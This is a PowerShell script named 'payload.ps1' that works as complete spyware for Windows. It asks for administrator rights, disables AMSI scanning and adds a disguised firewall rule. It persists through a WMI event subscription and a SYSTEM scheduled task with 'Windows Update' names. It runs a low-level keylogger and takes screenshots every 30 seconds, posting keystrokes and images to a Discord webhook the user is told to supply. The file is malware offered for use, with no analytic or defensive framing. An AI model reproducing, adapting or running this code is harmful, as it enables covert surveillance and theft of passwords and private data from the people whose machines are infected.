# payload.ps1

# Stage 1: Initialization and Elevation
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$env:temp\payload.ps1`"" -Verb RunAs
    Exit
}

# Stage 2: Environment Preparation
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$webhookUrl = "LINKTOYOUROWNWEBHOOKURLDISCORD"

# Stage 3: System Modifications
New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Action Allow -Program "powershell.exe" -ErrorAction SilentlyContinue

# Stage 4: Persistence Mechanisms
$persistenceScript = {
    $wmiArgs = @{
        EventNamespace = 'root/cimv2'
        Name = 'WindowsUpdateMonitor'
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
        QueryLanguage = 'WQL'
    }
    $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $wmiArgs

    $consumerArgs = @{
        Name = 'WindowsUpdateTask'
        CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
    }
    $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

    $bindingArgs = @{
        Filter = [Ref]$filter
        Consumer = [Ref]$consumer
    }
    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs

    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsUpdateMaintenance" -Action $taskAction -Trigger $taskTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
}

Invoke-Command -ScriptBlock $persistenceScript

# Stage 5: Background Operations
Start-Job -Name "Keylogger" -ScriptBlock {
    Add-Type -TypeDefinition @"
    using System;
    using System.IO;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    
    public class Keylogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logPath = Path.Combine(Path.GetTempPath(), "systemlog.txt");
        
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                File.AppendAllText(logPath, ((Keys)vkCode).ToString() + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public static void Main() {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(curModule.ModuleName), 0);
            }
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
"@
    [Keylogger]::Main()
}

Start-Job -Name "ScreenCapture" -ScriptBlock {
    while ($true) {
        try {
            Add-Type -AssemblyName System.Windows.Forms
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            $memoryStream = New-Object System.IO.MemoryStream
            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $bytes = $memoryStream.ToArray()
            $base64 = [Convert]::ToBase64String($bytes)
            
            $payload = @{
                content = "System Update Report"
                embeds = @(@{
                    image = @{
                        url = "data:image/jpeg;base64,$base64"
                    }
                })
            }
            
            Invoke-RestMethod -Uri $using:webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Start-Sleep -Seconds 30
    }
}

# Stage 6: Cleanup and Maintenance
while ($true) {
    try {
        Get-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue | ForEach-Object {
            $payload = @{ content = "System Log: $_" }
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        }
        Clear-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Minutes 15
}